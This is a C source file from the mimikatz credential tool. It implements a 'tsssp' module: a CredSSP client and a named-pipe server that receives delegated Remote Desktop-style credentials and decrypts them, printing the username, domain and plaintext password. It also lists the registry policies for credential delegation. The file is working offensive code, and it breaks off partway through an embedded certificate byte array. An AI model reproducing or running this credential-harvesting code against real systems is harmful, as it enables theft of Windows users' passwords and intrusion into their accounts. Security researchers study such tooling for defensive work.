/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_tsssp.h"

const KUHL_M_C kuhl_m_c_tsssp[] = {
	{kuhl_m_tsssp_server,	L"server",	NULL},
	{kuhl_m_tsssp_client,	L"client",	NULL},
	{kuhl_m_tsssp_list,		L"list",	NULL},
};
const KUHL_M kuhl_m_tsssp = {
	L"tsssp",	L"TSSSP module", NULL,
	ARRAYSIZE(kuhl_m_c_tsssp), kuhl_m_c_tsssp, NULL, NULL
};

NTSTATUS kuhl_m_tsssp_client(int argc, wchar_t * argv[])
{
	HANDLE hPipe;
	SECURITY_STATUS initStatus, status;
	CredHandle hClientCred;
	CtxtHandle hClientCtx;
	SecBuffer SBClientIn[2] = {{0, SECBUFFER_TOKEN, NULL}, {sizeof(TSSSP_HC_CERTIFICATE), SECBUFFER_READONLY | SECBUFFER_TOKEN, (PVOID) TSSSP_HC_CERTIFICATE}}, SBClientOut = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc SBDClientIn = {SECBUFFER_VERSION, 1 /**/, SBClientIn}, SBDClientOut = {SECBUFFER_VERSION, 1, &SBClientOut};
	ULONG ClientContextAttr;
	LPCWCHAR szPipeName, szClientTarget;

	kull_m_string_args_byName(argc, argv, L"pipe", &szPipeName, L"\\\\.\\pipe\\" MIMIKATZ L"_tsssp_endpoint");

	if(kull_m_string_args_byName(argc, argv, L"target", &szClientTarget, NULL))
	{
		kprintf(L"AcquireCredentialsHandle: ");
		status = AcquireCredentialsHandle(NULL, L"TSSSP", SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hClientCred, NULL);
		if(status == SEC_E_OK)
		{
			kprintf(L"OK\n[pipe] Create client \'%s\': ", szPipeName);
			if(kull_m_pipe_client(szPipeName, &hPipe))
			{
				kprintf(L"OK\nInitializeSecurityContext(0): ");
				initStatus = status = InitializeSecurityContext(&hClientCred, NULL, (SEC_WCHAR *) szClientTarget, CLIENT_FLAGS, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);		
				SBDClientIn.cBuffers = 2;
				while(status == SEC_I_CONTINUE_NEEDED)
				{
					kprintf(L"OK\n");
					kuhl_m_tsssp_freeBuffer(&SBClientIn[0], FALSE);
					if(kuhl_m_tsssp_send_recv(hPipe, &SBClientOut, &SBClientIn[0]))
					{
						kprintf(L"InitializeSecurityContext(n): ");
						kuhl_m_tsssp_freeBuffer(&SBClientOut, TRUE);
						status = InitializeSecurityContext(&hClientCred, &hClientCtx, (SEC_WCHAR *) szClientTarget, CLIENT_FLAGS, 0, SECURITY_NATIVE_DREP, &SBDClientIn, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);
					}
					else break;
				}
				if(status == SEC_E_OK)
				{
					kprintf(L"OK (end)\n");
					kull_m_pipe_write(hPipe, SBClientOut.pvBuffer, SBClientOut.cbBuffer);
				}

				kuhl_m_tsssp_freeBuffer(&SBClientOut, TRUE);
				kuhl_m_tsssp_freeBuffer(&SBClientIn[0], FALSE);

				if((status != SEC_E_OK) && (status != SEC_I_CONTINUE_NEEDED))
					PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
				if(NT_SUCCESS(initStatus))
					DeleteSecurityContext(&hClientCtx);
				kull_m_pipe_close(&hPipe);
			}
			FreeCredentialHandle(&hClientCred);
		}
		else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
	}
	else PRINT_ERROR(L"target argument is missing, like: /target:TERMSRV/server.lab.local\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tsssp_server(int argc, wchar_t * argv[])
{
	HANDLE hPipe;
	SECURITY_STATUS initStatus, status;
	CredHandle hServerCred;
	CtxtHandle hServerCtx;
	SecBuffer SBServerIn = {0, SECBUFFER_TOKEN, NULL}, SBServerOut = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc SBDServerIn = {SECBUFFER_VERSION, 1, &SBServerIn}, SBDServerOut = {SECBUFFER_VERSION, 1, &SBServerOut};
	LPCWCHAR szPipeName;

	kull_m_string_args_byName(argc, argv, L"pipe", &szPipeName, L"\\\\.\\pipe\\" MIMIKATZ L"_tsssp_endpoint");
	kprintf(L"AcquireCredentialsHandle: ");
	status = kuhl_m_tsssp_AcquireCredentialsHandle(NULL, &hServerCred);
	if(status == SEC_E_OK)
	{
		kprintf(L"OK\n[pipe] Create server \'%s\': ", szPipeName);
		if(kull_m_pipe_server(szPipeName, &hPipe))
		{
			kprintf(L"OK\n[pipe] Waiting...: ");
			if(kull_m_pipe_server_connect(hPipe))
			{
				kprintf(L"OK\n");
				if(kull_m_pipe_read(hPipe, (LPBYTE *) &SBServerIn.pvBuffer, &SBServerIn.cbBuffer))
				{
					kprintf(L"AcceptSecurityContext(0): ");
					initStatus = status = kuhl_m_tsssp_AcceptSecurityContext(&hServerCred, NULL, &SBDServerIn, &hServerCtx, &SBDServerOut);
					while(status == SEC_I_CONTINUE_NEEDED)
					{
						kuhl_m_tsssp_freeBuffer(&SBServerIn, FALSE);
						if(kuhl_m_tsssp_send_recv(hPipe, &SBServerOut, &SBServerIn))
						{
							kprintf(L"AcceptSecurityContext(n): ");
							kuhl_m_tsssp_freeBuffer(&SBServerOut, TRUE);
							status = kuhl_m_tsssp_AcceptSecurityContext(&hServerCred, &hServerCtx, &SBDServerIn, &hServerCtx, &SBDServerOut);
						}
						else break;
					}
					kuhl_m_tsssp_freeBuffer(&SBServerOut, TRUE);
					kuhl_m_tsssp_freeBuffer(&SBServerIn, FALSE);
					if((status != SEC_E_OK) && (status != SEC_I_CONTINUE_NEEDED))
						PRINT_ERROR(L"AcceptSecurityContext: 0x%08x\n", status);
					if(NT_SUCCESS(initStatus))
						DeleteSecurityContext(&hServerCtx);
				}
			}
			kull_m_pipe_close(&hPipe);
		}
		FreeCredentialHandle(&hServerCred);
	}
	else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
	return STATUS_SUCCESS;
}

LPCWCHAR AllowToCheck[] = {L"AllowDefaultCredentials", L"AllowDefCredentialsWhenNTLMOnly", L"ConcatenateDefaults_AllowDefault", L"ConcatenateDefaults_AllowDefNTLMOnly"};
NTSTATUS kuhl_m_tsssp_list(int argc, wchar_t * argv[])
{
	LONG regError;
	HKEY hPd;
	DWORD i, dwData, dwSize;

	kprintf(L"\nLocal policy:\n");
	regError = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation", 0, KEY_READ | KEY_WOW64_64KEY, &hPd);
	if(regError == ERROR_SUCCESS)
	{
		for(i = 0; i < ARRAYSIZE(AllowToCheck); i++)
		{
			kprintf(L"  * %-36s  ", AllowToCheck[i]);
			dwSize = sizeof(dwData);
			regError = RegQueryValueEx(hPd, AllowToCheck[i], NULL, NULL, (LPBYTE) &dwData, &dwSize);
			if(regError == ERROR_SUCCESS)
				kprintf(L"%u", dwData);
			else if(regError == ERROR_FILE_NOT_FOUND)
				kprintf(L"-");
			else PRINT_ERROR(L"RegQueryValueEx: 0x%08x", regError);
			kprintf(L"\n");
		}
		kprintf(L"\n");
		kuhl_m_tsssp_list_data(hPd);
		RegCloseKey(hPd);
	}
	else if(regError == ERROR_FILE_NOT_FOUND)
		kprintf(L"No local policy!\n");
	else PRINT_ERROR(L"RegOpenKeyEx: 0x%08x\n", regError);
	
	kprintf(L"\n\nCredssp default policy:\n");
	regError = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Credssp\\PolicyDefaults", 0, KEY_READ, &hPd);
	if(regError == ERROR_SUCCESS)
	{
		kuhl_m_tsssp_list_data(hPd);
		RegCloseKey(hPd);
	}
	else if(regError == ERROR_FILE_NOT_FOUND)
		kprintf(L"No Credssp default policy!\n");
	else PRINT_ERROR(L"RegOpenKeyEx: 0x%08x\n", regError);
	
	return STATUS_SUCCESS;
}

LPCWCHAR AllowToCheckData[] = {L"AllowDefaultCredentials", L"AllowDefaultCredentialsDomain", L"AllowDefaultCredentialsWhenNTLMOnly", L"AllowDefaultCredentialsWhenNTLMOnlyDomain"};
void kuhl_m_tsssp_list_data(HKEY hPd)
{
	HKEY hData;
	LONG regError;
	DWORD i, j, type, nbValues, szMaxValueNameLen, szMaxValueLen, szKeyLen, szValueLen;
	wchar_t *keyName, *valueName;

	for(i = 0; i < ARRAYSIZE(AllowToCheckData); i++)
	{
		kprintf(L"  [%s]\n", AllowToCheckData[i]);
		regError = RegOpenKeyEx(hPd, AllowToCheckData[i], 0, KEY_READ | KEY_WOW64_64KEY, &hData);
		if(regError == ERROR_SUCCESS)
		{
			regError = RegQueryInfoKey(hData, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL);
			if(regError == ERROR_SUCCESS)
			{
				szMaxValueNameLen++;
				if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
				{
					if(valueName = (wchar_t *) LocalAlloc(LPTR, szMaxValueLen))
					{
						for(j = 0; j < nbValues; j++)
						{
							szKeyLen = szMaxValueNameLen;
							szValueLen = szMaxValueLen;
							regError = RegEnumValue(hData, j, keyName, &szKeyLen, NULL, &type, (LPBYTE) valueName, &szValueLen);
							if(regError == ERROR_SUCCESS)
							{
								if(type == REG_SZ)
									kprintf(L"    %-*s | %s\n", szMaxValueNameLen - 1, keyName, valueName);
							}
							else if(regError != ERROR_NO_MORE_ITEMS) PRINT_ERROR(L"RegEnumValue: 0x%08x", regError);
						}
						LocalFree(valueName);
					}
					LocalFree(keyName);
				}
			}
			else PRINT_ERROR(L"RegQueryInfoKey: 0x%08x", regError);
			RegCloseKey(hData);
		}
		else if(regError != ERROR_FILE_NOT_FOUND) PRINT_ERROR(L"RegOpenKeyEx: 0x%08x", regError);
	}
}

BOOL kuhl_m_tsssp_send_recv(HANDLE hPipe, PSecBuffer toSend, PSecBuffer toRecv)
{
	BOOL status = FALSE;
	if(kull_m_pipe_write(hPipe, toSend->pvBuffer, toSend->cbBuffer))
		status = kull_m_pipe_read(hPipe, (LPBYTE *) &toRecv->pvBuffer, &toRecv->cbBuffer);
	return status;
}

void kuhl_m_tsssp_freeBuffer(PSecBuffer buffer, BOOL isContext)
{
	if(buffer->pvBuffer)
	{
		if(isContext)
			FreeContextBuffer(buffer->pvBuffer);
		else
			LocalFree(buffer->pvBuffer);
		buffer->cbBuffer = 0;
		buffer->pvBuffer = NULL;
	}
}

void kuhl_m_tsssp_printOctet1String(_octet1 *data)
{
	if(data)
		kprintf(L"%.*s", data->length / sizeof(wchar_t), data->value);
}

SECURITY_STATUS kuhl_m_tsssp_AcquireCredentialsHandle(__in_opt LPWSTR pszPrincipal, __out PCredHandle phCredential)
{
	return AcquireCredentialsHandle(pszPrincipal, L"Negotiate", SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, phCredential, NULL);
}

SECURITY_STATUS kuhl_m_tsssp_AcceptSecurityContext(__in_opt PCredHandle phCredential, __in_opt PCtxtHandle phContext, __in_opt PSecBufferDesc pInput, __in_opt PCtxtHandle phNewContext, __in_opt PSecBufferDesc pOutput)
{
	SECURITY_STATUS status = SEC_E_INVALID_PARAMETER;
	ULONG ContextAttr = 0;
	TSRequest *InputTsReq = NULL, OutputTsReq = {0};
	OssBuf InputTsEncoded = {0, NULL}, OutputTsEncoded = {0, NULL};
	int internDpu = TSRequest_PDU;
	struct NegoData negoData;
	SecBuffer SBServerIn = {0, SECBUFFER_TOKEN, NULL}, SBServerOut = {0, SECBUFFER_TOKEN, NULL}, SBDecodedData = {0, SECBUFFER_DATA, NULL}, SBToEncrypt = {0, SECBUFFER_DATA, NULL};
	SecBufferDesc SBDServerIn = {SECBUFFER_VERSION, 1, &SBServerIn}, SBDServerOut = {SECBUFFER_VERSION, 1, &SBServerOut};
	_octet1 PublicKey = {TSSSP_HC_CERTIFICATE_PUBLICKEY_LENGTH, (PBYTE) TSSSP_HC_CERTIFICATE + TSSSP_HC_CERTIFICATE_PUBLICKEY_OFFSET};

	SecPkgContext_NegotiationInfo negoInfo = {0};
	SecPkgContext_Names names = {0};

	if(pInput && pInput->cBuffers && pInput->pBuffers && pInput->pBuffers[0].cbBuffer && pInput->pBuffers[0].pvBuffer)
	{
		InputTsEncoded.length = pInput->pBuffers[0].cbBuffer;
		InputTsEncoded.value = (unsigned char *) pInput->pBuffers[0].pvBuffer;
		if(!ossDecode(&kull_m_kerberos_asn1_world, &internDpu, &InputTsEncoded, (LPVOID *) &InputTsReq))
		{
			kprintf(L"\n[InputTsReq v%i]\n", InputTsReq->version);
			OutputTsReq.version = InputTsReq->version;
			if(InputTsReq->bit_mask & (negoTokens_present | pubKeyAuth_present))
			{
				if(InputTsReq->bit_mask & negoTokens_present)
				{
					kprintf(L"  [negoTokens]\n");
					SBServerIn.pvBuffer = InputTsReq->negoTokens->value.negoToken.value;
					SBServerIn.cbBuffer = InputTsReq->negoTokens->value.negoToken.length;
					status = AcceptSecurityContext(phCredential, phContext, &SBDServerIn, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_USE_SESSION_KEY | ASC_REQ_CONFIDENTIALITY | ASC_REQ_DELEGATE, SECURITY_NATIVE_DREP, phNewContext, &SBDServerOut, &ContextAttr, NULL);

					if(SBServerOut.cbBuffer && SBServerOut.pvBuffer) //
					{
						negoData.value.negoToken.length = SBServerOut.cbBuffer;
						negoData.value.negoToken.value = (unsigned char *) SBServerOut.pvBuffer;
						negoData.next = NULL;
						OutputTsReq.bit_mask |= negoTokens_present;
						OutputTsReq.negoTokens = &negoData;
					}

					if(status == SEC_E_OK)
					{
						if(QueryContextAttributes(phContext, SECPKG_ATTR_NEGOTIATION_INFO, &negoInfo) == SEC_E_OK)
						{
							if(negoInfo.PackageInfo)
							{
								kprintf(L"  [Package] %s\n", negoInfo.PackageInfo->Name);
								FreeContextBuffer(negoInfo.PackageInfo);
							}
						}
						if(QueryContextAttributes(phContext, SECPKG_ATTR_NAMES, &names) == SEC_E_OK)
						{
							if(names.sUserName)
							{
								kprintf(L"  [UserName] %s\n", names.sUserName);
								FreeContextBuffer(names.sUserName);
							}
						}
					}
				}
				if(InputTsReq->bit_mask & pubKeyAuth_present)
				{
					kprintf(L"  [pubKeyAuth]\n    Encrypted: "); kull_m_string_wprintf_hex(InputTsReq->pubKeyAuth.value, InputTsReq->pubKeyAuth.length, 0);
					kprintf(L"\n    Decrypted: ");
					if(kuhl_m_tsssp_Decrypt(phContext, &InputTsReq->pubKeyAuth, &SBDecodedData))
					{
						kull_m_string_wprintf_hex(SBDecodedData.pvBuffer, SBDecodedData.cbBuffer, 0); kprintf(L"\n");
						LocalFree(SBDecodedData.pvBuffer); // we don't care about, really...
					}
					if(InputTsReq->bit_mask & clientNonce_present)
					{
						if(InputTsReq->version >= 5)
						{
							kprintf(L"  [clientNonce]\n    "); kull_m_string_wprintf_hex(InputTsReq->clientNonce.value, InputTsReq->clientNonce.length, 0); kprintf(L"\n");
							if(kuhl_m_tsssp_SHA256(TRUE, &InputTsReq->clientNonce, &PublicKey, &SBDecodedData))
							{
								kprintf(L"    SHA256(client): "); kull_m_string_wprintf_hex(SBDecodedData.pvBuffer, SBDecodedData.cbBuffer, 0); kprintf(L"\n");
								LocalFree(SBDecodedData.pvBuffer);
							}
							if(kuhl_m_tsssp_SHA256(FALSE, &InputTsReq->clientNonce, &PublicKey, &SBToEncrypt))
							{
								kprintf(L"    SHA256(server): "); kull_m_string_wprintf_hex(SBToEncrypt.pvBuffer, SBToEncrypt.cbBuffer, 0); kprintf(L"\n");
							}
						}
						else PRINT_ERROR(L"clientNonce_present with version %i ?\n", InputTsReq);
					}
					else
					{
						if(InputTsReq->version < 5)
						{
							SBToEncrypt.cbBuffer = PublicKey.length;
							if(SBToEncrypt.pvBuffer = LocalAlloc(LPTR, SBToEncrypt.cbBuffer))
							{
								RtlCopyMemory(SBToEncrypt.pvBuffer, PublicKey.value, SBToEncrypt.cbBuffer); // this is bad, and you should feel bad
								((PBYTE) SBToEncrypt.pvBuffer)[0]++;
							}
						}
						else PRINT_ERROR(L"no clientNonce_present with version %i ?\n", InputTsReq);
					}

					if(SBToEncrypt.pvBuffer)
					{
						if(kuhl_m_tsssp_Encrypt(phContext, &SBToEncrypt, &OutputTsReq.pubKeyAuth))
							OutputTsReq.bit_mask |= pubKeyAuth_present;
						LocalFree(SBToEncrypt.pvBuffer);
					}
				}

				if(OutputTsReq.bit_mask) // something to encode !
				{
					status = SEC_I_CONTINUE_NEEDED;
					if(!ossEncode(&kull_m_kerberos_asn1_world, TSRequest_PDU, &OutputTsReq, &OutputTsEncoded))
					{
						if(pOutput->pBuffers[0].pvBuffer = LocalAlloc(LPTR, OutputTsEncoded.length))
						{
							pOutput->pBuffers[0].cbBuffer = OutputTsEncoded.length;
							RtlCopyMemory(pOutput->pBuffers[0].pvBuffer, OutputTsEncoded.value, OutputTsEncoded.length);
						}
						ossFreeBuf(&kull_m_kerberos_asn1_world, OutputTsEncoded.value);
					}
					else PRINT_ERROR(L"Unable to encode TSRequest: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
				}
				if(OutputTsReq.pubKeyAuth.value)
					LocalFree(OutputTsReq.pubKeyAuth.value);
				kuhl_m_tsssp_freeBuffer(&SBServerOut, TRUE);
			}
			else if(InputTsReq->bit_mask & authInfo_present)
			{
				kprintf(L"  [authInfo]\n    Encrypted: "); kull_m_string_wprintf_hex(InputTsReq->authInfo.value, InputTsReq->authInfo.length, 0);
				kprintf(L"\n    Decrypted: ");
				if(kuhl_m_tsssp_Decrypt(phContext, &InputTsReq->authInfo, &SBDecodedData))
				{
					kull_m_string_wprintf_hex(SBDecodedData.pvBuffer, SBDecodedData.cbBuffer, 0); kprintf(L"\n");
					kuhl_m_tsssp_TSCredentials(&SBDecodedData);
					LocalFree(SBDecodedData.pvBuffer);
					status = SEC_E_OK;
				}
				else status = SEC_E_DECRYPT_FAILURE;
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, TSRequest_PDU, InputTsReq);
		}
		else PRINT_ERROR(L"Unable to decode TSRequest: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
	}
	return status;
}

void kuhl_m_tsssp_TSCredentials(PSecBuffer data)
{
	OssBuf InputTsEncoded = {data->cbBuffer, (unsigned char *) data->pvBuffer};
	int internDpu = TSCredentials_PDU;
	TSCredentials *InputTsCredentials = NULL;
	TSPasswordCreds *InputTsPasswordCreds;
	TSSmartCardCreds *InputTsSmartCardCreds;
	TSRemoteGuardCreds *InputTsRemoteGuardCreds;
	PVOID *ts;

	if(!ossDecode(&kull_m_kerberos_asn1_world, &internDpu, &InputTsEncoded, (LPVOID *) &InputTsCredentials))
	{
		switch(InputTsCredentials->credType)
		{
		case 1:
			kprintf(L"    [Password]\n");
			internDpu = TSPasswordCreds_PDU;
			ts = (PVOID *) &InputTsPasswordCreds;
			break;

		case 2:
			kprintf(L"    [Smartcard]\n");
			internDpu = TSSmartCardCreds_PDU;
			ts = (PVOID *) &InputTsSmartCardCreds;
			break;

		case 6:
			kprintf(L"    [Remote CredentialGuard]\n");
			internDpu = TSRemoteGuardCreds_PDU;
			ts = (PVOID *) &InputTsRemoteGuardCreds;
			break;
		default:
			PRINT_ERROR(L"Unknown credentials? (%i)\n", InputTsCredentials->credType);
			ts = NULL;
		}

		if(ts)
		{
			*ts = NULL;
			if(!ossDecode(&kull_m_kerberos_asn1_world, &internDpu, (OssBuf *) &InputTsCredentials->credentials, ts))
			{
				switch(InputTsCredentials->credType)
				{
				case 1:
					kprintf(L"    * Username: ");
					kuhl_m_tsssp_printOctet1String(&InputTsPasswordCreds->userName);
					kprintf(L"\n    * Domain  : ");
					kuhl_m_tsssp_printOctet1String(&InputTsPasswordCreds->domainName);
					kprintf(L"\n    * Password: ");
					kuhl_m_tsssp_printOctet1String(&InputTsPasswordCreds->password);
					kprintf(L"\n");
					break;
				case 2:
					// TODO
					//InputTsSmartCardCreds->pin
					break;
				case 6:
					// TODO
					// InputTsRemoteGuardCreds
					;
				}
				ossFreePDU(&kull_m_kerberos_asn1_world, internDpu, *ts);
			}
			else PRINT_ERROR(L"Unable to decode TS*Creds: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
		}
		ossFreePDU(&kull_m_kerberos_asn1_world, TSCredentials_PDU, InputTsCredentials);
	}
	else PRINT_ERROR(L"Unable to decode TSCredentials: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
}

BOOL kuhl_m_tsssp_Encrypt(PCtxtHandle phContext, PSecBuffer data, _octet1 *out)
{
	BOOL status = FALSE;
	SECURITY_STATUS subStatus;
	SecBuffer SBToCrypt[3] = {{0, SECBUFFER_TOKEN, NULL}, {0, SECBUFFER_DATA, NULL}, {0, SECBUFFER_PADDING, NULL}};
	SecBufferDesc SBDToCrypt = {SECBUFFER_VERSION, ARRAYSIZE(SBToCrypt), SBToCrypt};
	SecPkgContext_Sizes sizes = {0};

	subStatus = QueryContextAttributes(phContext, SECPKG_ATTR_SIZES, &sizes);
	if(subStatus == SEC_E_OK)
	{
		SBToCrypt[0].cbBuffer = sizes.cbSecurityTrailer;
		SBToCrypt[1].cbBuffer = data->cbBuffer;
		SBToCrypt[2].cbBuffer = sizes.cbBlockSize;
		if(SBToCrypt[0].pvBuffer = LocalAlloc(LPTR, SBToCrypt[0].cbBuffer + SBToCrypt[1].cbBuffer + SBToCrypt[2].cbBuffer))
		{
			SBToCrypt[1].pvBuffer = (PBYTE) SBToCrypt[0].pvBuffer + SBToCrypt[0].cbBuffer;
			SBToCrypt[2].pvBuffer = (PBYTE) SBToCrypt[1].pvBuffer + SBToCrypt[1].cbBuffer;
			RtlCopyMemory(SBToCrypt[1].pvBuffer, data->pvBuffer, SBToCrypt[1].cbBuffer);
			subStatus = EncryptMessage(phContext, 0, &SBDToCrypt, 0);
			if(subStatus == SEC_E_OK)
			{
				out->length = SBToCrypt[0].cbBuffer + SBToCrypt[1].cbBuffer + SBToCrypt[2].cbBuffer;
				if(out->value = (unsigned char *) LocalAlloc(LPTR, out->length))
				{
					RtlCopyMemory(out->value, SBToCrypt[0].pvBuffer, SBToCrypt[0].cbBuffer);
					RtlCopyMemory(out->value + SBToCrypt[0].cbBuffer, SBToCrypt[1].pvBuffer, SBToCrypt[1].cbBuffer);
					RtlCopyMemory(out->value + SBToCrypt[0].cbBuffer + SBToCrypt[1].cbBuffer, SBToCrypt[2].pvBuffer, SBToCrypt[2].cbBuffer);
					status = TRUE;
				}
			}
			else PRINT_ERROR(L"EncryptMessage: 0x%08x\n", subStatus);
			LocalFree(SBToCrypt[0].pvBuffer);
		}
	}
	else PRINT_ERROR(L"QueryContextAttributes: 0x%08x\n", subStatus);
	return status;
}

BOOL kuhl_m_tsssp_Decrypt(PCtxtHandle phContext, _octet1 *data, PSecBuffer out)
{
	BOOL status = FALSE;
	SECURITY_STATUS subStatus;
	SecBuffer SBToDecrypt[2] = {{data->length, SECBUFFER_STREAM, NULL}, {0, SECBUFFER_DATA, NULL}};
	SecBufferDesc SBDToDecrypt = {SECBUFFER_VERSION, ARRAYSIZE(SBToDecrypt), SBToDecrypt};

	if(SBToDecrypt[0].pvBuffer = LocalAlloc(LPTR, SBToDecrypt[0].cbBuffer))
	{
		RtlCopyMemory(SBToDecrypt[0].pvBuffer, data->value, SBToDecrypt[0].cbBuffer);
		subStatus = DecryptMessage(phContext, &SBDToDecrypt, 0, NULL);
		if(subStatus == SEC_E_OK)
		{
			if(out->pvBuffer = LocalAlloc(LPTR, SBToDecrypt[1].cbBuffer))
			{
				RtlCopyMemory(out->pvBuffer, SBToDecrypt[1].pvBuffer, SBToDecrypt[1].cbBuffer);
				out->cbBuffer = SBToDecrypt[1].cbBuffer;
				status = TRUE;
			}
		}
		else PRINT_ERROR(L"DecryptMessage: 0x%08x\n", subStatus);
		LocalFree(SBToDecrypt[0].pvBuffer);
	}
	return status;
}

const char kuhl_m_tsssp_ClientServerHashMagic[] = "CredSSP Client-To-Server Binding Hash", kuhl_m_tsssp_ServerClientHashMagic[] = "CredSSP Server-To-Client Binding Hash";
BOOL kuhl_m_tsssp_SHA256(BOOL isClient, _octet1 *Nonce, _octet1 *PublicKey, PSecBuffer out)
{
	BOOL status = FALSE;
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;

	if(CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if(CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
		{
			if(CryptHashData(hHash, (LPCBYTE) (isClient ? kuhl_m_tsssp_ClientServerHashMagic : kuhl_m_tsssp_ServerClientHashMagic), isClient ? sizeof(kuhl_m_tsssp_ClientServerHashMagic) : sizeof(kuhl_m_tsssp_ServerClientHashMagic), 0))
			{
				if(CryptHashData(hHash, Nonce->value, Nonce->length, 0))
				{
					if(CryptHashData(hHash, PublicKey->value, PublicKey->length, 0))
					{
						if(CryptGetHashParam(hHash, HP_HASHVAL, NULL, &out->cbBuffer, 0))
						{
							if(out->pvBuffer = LocalAlloc(LPTR, out->cbBuffer))
							{
								if(!(status = CryptGetHashParam(hHash, HP_HASHVAL, (PBYTE) out->pvBuffer, &out->cbBuffer, 0)))
								{
									PRINT_ERROR_AUTO(L"CryptGetHashParam(val)");
									LocalFree(out->pvBuffer);
									out->cbBuffer = 0;
								}
							}
						}
						else PRINT_ERROR_AUTO(L"CryptGetHashParam(init)");
					}
					else PRINT_ERROR_AUTO(L"CryptHashData(PublicKey)");
				}
				else PRINT_ERROR_AUTO(L"CryptHashData(Nonce)");
			}
			else PRINT_ERROR_AUTO(L"CryptHashData(Magic)");
			CryptDestroyHash(hHash);
		}
		CryptReleaseContext(hProv, 0);
	}
	return status;
}

const BYTE TSSSP_HC_CERTIFICATE[742] = {0xe2, 0x02, 0x00, 0x00,
	0x30, 0x82, 0x02, 0xde, 0x30, 0x82, 0x01, 0xc6, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02,	0x10, 0x58, 0x1b, 0x21, 0xa3, 0x99, 0xa8, 0xff, 0x87, 0x40, 0xf7, 0x7b, 0xb9, 0x2c, 0x00, 0x30, 0xd2, 0x30,
	0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x18, 0x31, 0x16,	0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x0d, 0x73, 0x72, 0x76, 0x2e, 0x6c,
	0x61, 0x62, 0x2e, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x30, 0x1e, 0x17, 0x0d, 0x31, 0x38, 0x30, 0x35, 0x31, 0x33, 0x32, 0x32, 0x33, 0x31, 0x32, 0x30, 0x5a, 0x17, 0x0d, 0x31, 0x38, 0x31, 0x31, 0x31,
	0x32, 0x32, 0x32, 0x33, 0x31, 0x32, 0x30, 0x5a, 0x30, 0x18, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x0d, 0x73, 0x72, 0x76, 0x2e, 0x6c, 0x61, 0x62, 0x2e, 0x6c, 0x6f, 0x63,
	0x61, 0x6c, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00,/**/ 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82,
	0x01, 0x01, 0x00, 0xbc, 0x41, 0xa3, 0xfa, 0xea, 0xa3, 0xbc, 0x97, 0x16, 0xc4, 0xac, 0x5d, 0x01, 0x1e, 0xc7, 0xe5, 0x61, 0x4b, 0xe1, 0xcd, 0xc7, 0x5b, 0xa1, 0xd0, 0xb5, 0xec, 0x07, 0x9c, 0xc6,
	0x22, 0x72, 0x1c, 0x24, 0xa6, 0xa8, 0x14, 0x73, 0xa1, 0xf2, 0x38, 0x76, 0x9c, 0x84, 0x99, 0xd8, 0xb0, 0x79, 0x48, 0x71, 0x49, 0x9a, 0x37, 0xeb, 0xf5, 0xe4, 0xf3, 0xed, 0xaf, 0x7c, 0x8b, 0xfd,
	0x9d, 0xed, 0xa8, 0x27, 0xc5, 0x05, 0x7f, 0x14, 0x96, 0x01, 0xb8, 0x5d, 0xee, 0x06, 0x4f, 0x36, 0x91, 0xae, 0xcd, 0xdb, 0x1a, 0x67, 0x76, 0xfc, 0x8f, 0x66, 0x87, 0xb3, 0xe0, 0xa1, 0xe1, 0x52,
	0x7e, 0xda, 0x4c, 0x97, 0x6d, 0x85, 0xa1, 0x53, 0xb5, 0xc8, 0x4e, 0xbd, 0x2a, 0xfd, 0xe8, 0x20, 0x17, 0x9f, 0x58, 0x78, 0x2d, 0x69, 0xf9, 0xcf, 0x07, 0xd2, 0xc4, 0xcd, 0xd8, 0x59, 0xcd, 0x2b,
	0x00, 0xed, 0xb3, 0x6b, 0x50, 0xae, 0xac, 0x5a, 0x78, 0xd6, 0x3a, 0xe5, 0xb4, 0x22, 0x91, 0xec, 0x75, 0x3b, 0x1b, 0x88, 0xc7, 0x94, 0x0d, 0x22, 0x24, 0xca, 0x30, 0xac, 0x7c, 0xd9, 0x01, 0x0b,
